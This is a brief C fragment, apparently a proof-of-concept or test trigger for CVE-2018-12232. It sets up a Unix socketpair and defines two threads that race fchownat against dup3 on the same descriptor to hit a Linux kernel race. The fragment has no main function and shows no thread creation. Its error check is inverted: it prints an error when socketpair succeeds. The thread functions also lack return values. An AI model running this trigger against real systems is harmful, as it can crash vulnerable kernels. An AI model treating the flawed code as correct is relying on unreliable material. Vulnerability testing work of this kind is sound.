#include <fcntl.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

int cve_2018_12232_fds[2];

void *cve_2018_12232_th1(void *arg) {
  int r2, r3;
  r2 = getuid();
  r3 = getegid();
  fchownat(cve_2018_12232_fds[0], "", r2, r3, 0x1000);
}

void *cve_2018_12232_th2(void *arg) {
  dup3(cve_2018_12232_fds[1], cve_2018_12232_fds[0], 0x80000);
}

void cve_2018_12232_init(void) {
  if (!socketpair(AF_UNIX, SOCK_STREAM, 0x0, cve_2018_12232_fds))
    perror("socketpair");
}
